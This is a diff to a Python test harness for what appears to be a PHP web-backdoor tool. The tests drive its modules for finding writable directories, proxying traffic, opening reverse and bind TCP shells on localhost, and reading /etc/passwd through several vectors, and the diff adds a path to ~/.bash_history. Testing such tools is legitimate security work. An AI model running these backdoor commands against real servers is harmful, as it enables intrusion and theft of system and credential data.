@@ -1,7 +1,7 @@
 from commands import getstatusoutput as run
-from os import system as run_bg
+from os import system as run_bg, getenv, remove
 from re import search, DOTALL
-
+from sys import argv
 
 class TestException(Exception):
     pass
@@ -13,6 +13,12 @@ urlpwd = '%s %s' % (url, pwd)
 writable_dir = 'writable'
 http_proxy = "http://localhost:8080"
 bd_tcp_port = 9090
+
+home = getenv("HOME")
+if home[-1] == '/': home = home[:-1]
+readable_file_in_home_directory = "%s/.bash_history" % home
+
+
 
 scripts = {
            
@@ -34,8 +40,9 @@ scripts = {
 
 class TG(list):
     
-    def __init__(self, description, TCs):
+    def __init__(self, name, description, TCs):
         
+        self.name = name
         self.description = description
         
         list.__init__(self)
@@ -45,7 +52,7 @@ class TG(list):
         
     def test(self):
         
-        print '\n[+] %s\n' % self.description
+        print '\n[%s] %s\n' % (self.name, self.description)
         
         for tc in self:
             tc.test()
@@ -92,7 +99,7 @@ class TC:
 
 TS = [
       
-      TG('Test "show"',
+      TG('show', 'Test "show"',
         [
         TC([ 'show',  'generate.asd' ],'Error'),                # show with existant mod
         TC([ 'show', 'sql.dump' ],'Error', negate=True),        # show good mod
@@ -102,7 +109,7 @@ TS = [
         TC([ urlpwd[3:], ':show sql.dump' ],'Error', negate=True)   # show wrong url cmdline
         ]),
       
-      TG('Test "set"',
+      TG('set', 'Test "set"',
         [
         TC([ urlpwd, ':set shell.sh cmd\=ls' ],'cmd=ls'),   # set variable with =
         TC([ urlpwd, ':set shell.sh ls' ],'cmd=ls'),   # set variable without =
@@ -112,7 +119,7 @@ TS = [
         ]),
       
 
-      TG('Test "load"',
+      TG('load', 'Test "load"',
         [
         TC([ urlpwd, ':load /tmp/tempscript' ],'\nOK test'),   # load working script
         TC([ urlpwd[:-1], ':load /tmp/tempscript' ],'\nOK test', negate=True),   # bad connection
@@ -120,7 +127,7 @@ TS = [
         ]),
       
       
-      TG('Test "find.name"',
+      TG('fname', 'Test "find.name"',
         [
         TC([ urlpwd, ':find.name ci %s .' % (writable_dir[2:-1].upper())], writable_dir),   # find if contains case insensitive
         TC([ urlpwd, ':find.name c %s' % (writable_dir[2:-1]) ], writable_dir),   # find if contains 
@@ -129,7 +136,7 @@ TS = [
         TC([ urlpwd, ':find.name ci ESOLV.CONF /etc/' ], 'resolv.conf'),   # find if contains case insensitive out of webroot
         ]),
       
-      TG('Test "find.perms"',
+      TG('fperms', 'Test "find.perms"',
         [
         TC([ urlpwd, ':find.perms first d w vector=ndee' ], 'Error, allowed values'),   # find with wrong vector
         TC([ urlpwd, ':find.perms first d w vector=find' ], writable_dir),   # find first writable dir
@@ -137,35 +144,84 @@ TS = [
         TC([ urlpwd, ':find.perms any f r /etc/' ], 'passwd')   # find any readable files
         ]),      
       
-      TG('Run background :net.proxy, set and use it to connect through',
+      TG('proxy', 'Run background :net.proxy, set and use it to connect through',
         [
         TC([ urlpwd, ':net.proxy' ],'', background=True),   # start proxy in background
         TC([ urlpwd, ':load /tmp/proxyscript' ],'\nOK test'),   # execute some command through proxy
         TC([ urlpwd, ':load /tmp/proxybrokescript' ],'Connection refused'),   # set wrong proxy
         ]),      
       
-      TG('Open TCP backdoors and check',
+      TG('backdoor', 'Open TCP backdoors and check',
         [
         TC([ urlpwd, ':backdoor.reverse_tcp localhost %i' % (bd_tcp_port) ], '', background=True),   # open reverse tcp shell in background
         TC([ urlpwd, ':backdoor.tcp %i' % bd_tcp_port ],'', background=True),   # connect with direct tcp 
         TC([ urlpwd, '"netstat -ap | grep %i"' % bd_tcp_port ],'.*\*:%i.*LISTEN.*localhost:%i.*ESTABLISHED.*localhost:%i.*ESTABLISHED.*' % (bd_tcp_port, bd_tcp_port, bd_tcp_port)) # check with netstat
         ]),
 
-      TG('Audit etc_passwd',
+      TG('etc_passwd', 'Audit etc_passwd',
         [
         TC([ urlpwd, ':audit.etc_passwd vector=posix_getpwuid' ], ':daemon:/usr/sbin:'), 
         TC([ urlpwd, ':audit.etc_passwd filter=True vector=fileread' ], ':daemon:/usr/sbin:', negate=True) 
+        ]),
+      
+      TG('read', 'Read remote file',
+        [
+        TC([ urlpwd, ':file.read /etc/passwd' ], ':daemon:/usr/sbin:'), 
+        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=base64' ], ':daemon:/usr/sbin:'), 
+        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=copy' ], ':daemon:/usr/sbin:'), 
+        TC([ urlpwd, ':file.read rpath=/etc/passwd vector=symlink' ], ':daemon:/usr/sbin:')
         ])
+      
+      
       ]       
     
-for script_path in scripts:
-    fscript = file(script_path,'w')
-    fscript.write(scripts[script_path])
-    fscript.close()
-    print '[+] Created "%s"' % script_path
+def restore_enviroinment():
+    for script_path in scripts:
+        remove(script_path)
+        
+    print '[+] Deleted script files: "%s"' % '", "'.join(scripts.keys())
+    
+    
+    
+def initialize_enviroinment():
+    
+    for script_path in scripts:
+        fscript = file(script_path,'w')
+        fscript.write(scripts[script_path])
+        fscript.close()
+    
+    print '[+] Created script files: "%s"' % '", "'.join(scripts.keys())
+
        
-try:
-    for tg in TS[7]:       
-        tg.test()
-except TestException, e:
-    print '[!] %s' % str(e)
+def parse_testlist_parameters():
+    
+    tslist = []
+    if len(argv) >= 2:
+        splittedlist = argv[1].split(',')
+        for par in splittedlist:
+            if par.isdigit():
+                tslist.append(int(par))
+            else:
+                tslist.append(par)
+    
+    return tslist
+       
+       
+def run_tests(tslist):
+    try:
+        i = 0
+        for ts in TS:       
+            if not tslist or ts.name in tslist or i in tslist:
+                ts.test()
+                
+            i+=1
+    except TestException, e:
+        print '[!] %s' % str(e)
+    
+    
+if __name__ == "__main__":
+    
+    initialize_enviroinment()
+    tslist = parse_testlist_parameters()
+    run_tests(tslist)
+    restore_enviroinment()
